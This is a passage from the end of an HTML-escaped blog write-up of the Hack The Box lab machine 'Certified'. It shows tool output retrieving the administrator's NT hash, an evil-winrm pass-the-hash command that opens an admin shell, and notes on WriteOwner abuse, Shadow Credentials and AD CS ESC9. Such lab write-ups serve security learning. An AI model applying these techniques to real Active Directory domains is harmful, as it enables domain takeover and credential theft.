- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using principal: &lt;span class=&quot;s1&quot;&gt;&apos;administrator@certified.htb&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Trying to get TGT...
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Got TGT
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Saving credential cache to &lt;span class=&quot;s1&quot;&gt;&apos;administrator.ccache&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Wrote credential cache to &lt;span class=&quot;s1&quot;&gt;&apos;administrator.ccache&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Trying to retrieve NT &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;administrator&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Got &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;administrator@certified.htb&apos;&lt;/span&gt;: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/certified-7.png&quot; alt=&quot;certified-7.htb&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Using NTLM hash we can authenticate via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 0d5b49608bbce1751f708748f67e2d34
-
-Evil-WinRM shell v3.9
-
-Warning: Remote path completions is disabled due to ruby limitation: undefined method &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;quoting_detection_proc&lt;span class=&quot;s1&quot;&gt;&apos; for module Reline
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; whoami
-certified\administrator
-*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; cat ~/Desktop/root.txt
-[REDACTED]
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/certified-8.png&quot; alt=&quot;certified-8.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ez.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-learnings&quot;&gt;🧠 Learnings&lt;/h2&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;&lt;strong&gt;Abusing WriteOwner Rights:&lt;/strong&gt; Having &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WriteOwner&lt;/code&gt; rights on an Active Directory object means you can completely change its ownership, overwrite DACL settings, and force your way into groups even if you don’t have direct write access initially.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Shadow Credentials as a Fallback:&lt;/strong&gt; When a Kerberoasted hash is uncrackable due to strong passwords, possessing generic write/modification access over an account allows you to leverage Shadow Credentials (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msDS-KeyCredentialLink&lt;/code&gt;) to cleanly extract the NT hash without needing to brute-force anything.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;AD CS ESC9 Flaws:&lt;/strong&gt; Certificate templates that lack security extensions allow users with account update rights to temporarily switch their UPN to match a high-value target like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;, tricking the Certificate Authority into generating a valid admin-level certificate.&lt;/li&gt;
 &lt;/ol&gt;
 </content>
   </entry>
